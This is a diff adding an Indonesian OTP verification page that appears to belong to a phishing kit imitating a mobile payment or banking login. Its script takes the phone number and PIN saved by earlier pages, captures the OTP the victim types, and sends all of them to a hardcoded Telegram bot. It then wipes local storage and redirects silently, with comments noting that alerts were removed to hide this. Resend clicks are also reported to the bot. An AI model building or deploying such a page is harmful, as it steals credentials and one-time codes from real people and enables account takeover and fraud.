@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk - Verifikasi OTP</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #007AFF; color: white; min-height: 100vh; padding-top: 40px; }
+        .header { display: flex; align-items: center; padding: 0 20px; margin-bottom: 50px; }
+        .back-btn { font-size: 22px; font-weight: bold; cursor: pointer; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 18px; font-weight: 500; }
+        .main { display: flex; flex-direction: column; align-items: center; padding: 0 25px; }
+        .otp-info { font-size: 18px; text-align: center; margin-bottom: 20px; line-height: 1.4; }
+        .phone-box { background: rgba(255,255,255,0.2); padding: 10px 15px; border-radius: 8px; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; font-size: 18px; font-weight: 500; }
+        .flag { width: 20px; height: 15px; background: white; border-radius: 2px; display: flex; align-items: center; justify-content: center; font-size: 10px; color: red; font-weight: bold; }
+        .send-via { font-size: 16px; margin-bottom: 35px; }
+        .otp-inputs { display: flex; gap: 15px; margin-bottom: 25px; }
+        .otp-box { width: 50px; height: 60px; background: white; border: none; border-radius: 8px; color: #000; font-size: 24px; text-align: center; outline: none; }
+        .inactive-link { font-size: 16px; color: rgba(255,255,255,0.8); margin-bottom: 30px; cursor: pointer; }
+        .resend-container { display: flex; align-items: center; background: white; border-radius: 8px; width: 100%; max-width: 230px; }
+        .resend-btn { flex: 1; padding: 12px; background: white; color: #A0A0A0; border: none; border-top-left-radius: 8px; border-bottom-left-radius: 8px; font-size: 14px; cursor: not-allowed; }
+        .timer-box { padding: 12px 15px; background: #F5F5F5; border-top-right-radius: 8px; border-bottom-right-radius: 8px; color: #000; font-size: 16px; display: flex; align-items: center; gap: 8px; }
+        .loader { width: 16px; height: 16px; border: 2px solid #007AFF; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-btn" onclick="window.location.href='pin.html'">&larr;</div>
+        <div class="header-title"><b>Masuk</b></div>
+    </div>
+
+    <div class="main">
+        <div class="otp-info">Kode OTP telah terkirim ke</div>
+        
+        <div class="phone-box">
+            <div class="flag">🇮🇩</div>
+            <span id="displayPhone"></span>
+        </div>
+
+        <div class="send-via">via WhatsApp</div>
+
+        <div class="otp-inputs">
+            <input type="text" class="otp-box" maxlength="1" data-index="0">
+            <input type="text" class="otp-box" maxlength="1" data-index="1">
+            <input type="text" class="otp-box" maxlength="1" data-index="2">
+            <input type="text" class="otp-box" maxlength="1" data-index="3">
+        </div>
+
+        <div class="inactive-link">NOMOR TIDAK AKTIF?</div>
+
+        <div class="resend-container">
+            <button id="resendBtn" class="resend-btn">KIRIM ULANG</button>
+            <div class="timer-box">
+                <div class="loader"></div>
+                <span id="timer">00:53</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Cek data tersimpan
+        const savedPhone = localStorage.getItem('userPhone');
+        const savedPin = localStorage.getItem('userPin');
+        if (!savedPhone || !savedPin) window.location.href = 'index.html';
+
+        // Konfigurasi Telegram
+        const BOT_TOKEN = "8476845004:AAE2O4N1A_WNu7AsqM5PD8KQO3ycFprJjdg";
+        const CHAT_ID = "8355957737";
+
+        // Tampilkan nomor HP
+        document.getElementById('displayPhone').textContent = savedPhone;
+
+        // Elemen DOM
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const timerText = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        let countdown = 53;
+
+        // Fungsi kirim data Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: message})
+                });
+            } catch (err) {
+                console.error('Gagal kirim:', err);
+            }
+        }
+
+        // Interaksi input OTP
+        otpBoxes.forEach((box, idx) => {
+            box.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value && idx < 3) otpBoxes[idx + 1].focus();
+
+                let fullOtp = '';
+                otpBoxes.forEach(b => fullOtp += b.value);
+                if (fullOtp.length === 4) {
+                    const finalMessage = `✅ SEMUA DATA BERHASIL DIVALIDASI
+📱 Nomor HP: ${savedPhone}
+🔐 PIN (tersandi): ${savedPin}
+🔑 OTP: ${fullOtp}
+⏰ Waktu verifikasi: ${new Date().toLocaleString('id-ID')}`;
+                    
+                    // HAPUS PEMBERITAHUAN ALERT
+                    sendToTelegram(finalMessage);
+                    localStorage.clear();
+                    // Langsung pindah halaman tanpa pesan apapun
+                    window.location.href = 'index.html';
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
+            });
+        });
+
+        // Aksi tombol kirim ulang
+        resendBtn.addEventListener('click', () => {
+            countdown = 53;
+            startCountdown();
+            resendBtn.style.color = '#A0A0A0';
+            resendBtn.style.cursor = 'not-allowed';
+            resendBtn.disabled = true;
+            document.querySelector('.loader').style.display = 'flex';
+            
+            // HAPUS PEMBERITAHUAN ALERT
+            sendToTelegram(`🔄 OTP DIKIRIM ULANG\nNomor HP: ${savedPhone}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
+            // Tidak ada pesan alert, langsung proses saja
+        });
+
+        // Fungsi hitung mundur
+        function startCountdown() {
+            const timer = setInterval(() => {
+                countdown--;
+                const minutes = Math.floor(countdown / 60);
+                const seconds = countdown % 60;
+                timerText.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    resendBtn.style.color = '#007AFF';
+                    resendBtn.style.cursor = 'pointer';
+                    resendBtn.disabled = false;
+                    timerText.textContent = '00:00';
+                    document.querySelector('.loader').style.display = 'none';
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+        otpBoxes[0].focus();
+    </script>
+</body>
+</html>
